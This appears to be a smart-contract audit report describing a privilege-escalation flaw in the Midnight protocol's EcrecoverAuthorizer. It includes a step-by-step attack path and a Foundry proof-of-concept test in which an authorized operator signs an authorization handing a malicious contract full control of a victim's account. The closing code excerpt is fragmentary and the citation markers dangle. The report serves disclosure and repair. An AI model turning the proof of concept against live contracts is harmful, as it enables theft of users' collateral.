### Title
Authorized Operator Can Grant Arbitrary Authorizations via EcrecoverAuthorizer, Enabling Full Account Takeover - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that is already authorized in Midnight on behalf of the `authorization.authorizer`, not only the authorizer's own key. An operator holding `isAuthorized[victim][operator] == true` can therefore sign an `Authorization` struct naming any `maliciousContract` as `authorized`, and the contract will call `midnight.setIsAuthorized(maliciousContract, true, victim)` — granting `maliciousContract` full Midnight control over the victim's account.

### Finding Description
**Root cause — line 34 of `src/periphery/EcrecoverAuthorizer.sol`:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The second branch accepts any signer for whom `isAuthorized[authorizer][signer]` is true. This is the same pattern used in `EcrecoverRatifier` (where it is appropriate for offer signing), but it is semantically wrong for authorization management: it lets an existing operator unilaterally expand the authorization set of the account that trusted them.

**Exact reachable path:**

Preconditions (both are normal operational states):
- `isAuthorized[victim][ecrecoverAuthorizer] == true` — victim opted into signature-based authorization
- `isAuthorized[victim][operator] == true` — victim granted operator some role

Attack:
1. Operator constructs `Authorization{authorizer: victim, authorized: maliciousContract, isAuthorized: true, nonce: nonce[victim], deadline: block.timestamp + 1}`.
2. Operator signs the EIP-712 digest with their own key.
3. Anyone calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
4. `ecrecover` returns `operator`; the check `isAuthorized[victim][operator]` is `true` → passes.
5. `midnight.setIsAuthorized(maliciousContract, true, victim)` is called with `msg.sender = ecrecoverAuthorizer`; the check `isAuthorized[victim][ecrecoverAuthorizer]` is `true` → passes.
6. `isAuthorized[victim][maliciousContract] = true` is written.

**Why existing checks fail:**
- `Midnight.setIsAuthorized` only checks that `msg.sender` (the `EcrecoverAuthorizer` contract) is authorized by `onBehalf` (victim) — it cannot distinguish a legitimate victim-signed call from an operator-escalated one.
- The Certora spec (`certora/specs/EcrecoverAuthorizer.spec`) only verifies nonce behavior; it explicitly skips signature authorization ("Signature verification is verified in tests"). The existing test `testEcrecoverAuthorizerInvalidSignature` only covers a completely unauthorized signer, not an authorized operator signing for the authorizer. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
Once `isAuthorized[victim][maliciousContract] == true`, `maliciousContract` can call every `onBehalf`-gated Midnight entry point as the victim: `withdrawCollateral`, `setConsumed`, `setIsAuthorized` (to further expand access), `take`, and any other function guarded by `isAuthorized[onBehalf][msg.sender]`. All victim collateral, credit, debt, and consumed state are under attacker control. [4](#0-3) 

### Likelihood Explanation
Preconditions are both standard operational states. Any user who uses `EcrecoverAuthorizer` must set `isAuthorized[victim][ecrecoverAuthorizer] = true`, and any user who delegates any task to an operator sets `isAuthorized[victim][operator] = true`. Both conditions are simultaneously true for any user who has both opted into signature-based authorization and granted an operator. The attack requires no special timing, no oracle manipulation, and is repeatable — the operator can also increment the nonce to replay with new targets. [5](#0-4) 

### Recommendation
Remove the `IMidnight(MIDNIGHT).isAuthorized(...)` branch from `EcrecoverAuthorizer.setIsAuthorized`. The sole purpose of this contract is to let the authorizer sign off-chain; only the authorizer's own key should be accepted:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

This aligns with the EIP-712 design intent: the signature binds the action to the authorizer's key, not to any delegated operator. [1](#0-0) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {
    Authorization, Signature,
    AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH
} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract OperatorEscalationTest is BaseTest {
    address malicious = makeAddr("malicious");

    function testOperatorGrantsArbitraryAuthorization() public {
        // Step 1: victim authorizes ecrecoverAuthorizer (normal setup)
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        // Step 2: victim authorizes operator (lender) for some purpose
        vm.prank(borrower);
        midnight.setIsAuthorized(lender, true, borrower);

        // Step 3: operator (lender) signs Authorization naming malicious as authorized
        Authorization memory auth = Authorization({
            authorizer: borrower,
            authorized: malicious,
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(borrower),
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSeparator = keccak256(
            abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer))
        );
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[lender], digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Step 4: submit — no victim involvement
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Assert: malicious now has full Midnight control over borrower
        assertTrue(midnight.isAuthorized(borrower, malicious));

        // Assert: malicious can act on borrower's behalf (e.g., setConsumed)
        vm.prank(malicious);
        midnight.setConsumed(bytes32(0), 0, borrower); // succeeds, no revert
    }
}
```

Expected assertions: `assertTrue(midnight.isAuthorized(borrower, malicious))` passes; the `setConsumed` call by `malicious` on behalf of `borrower` does not revert. [6](#0-5) [7](#0-6)

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
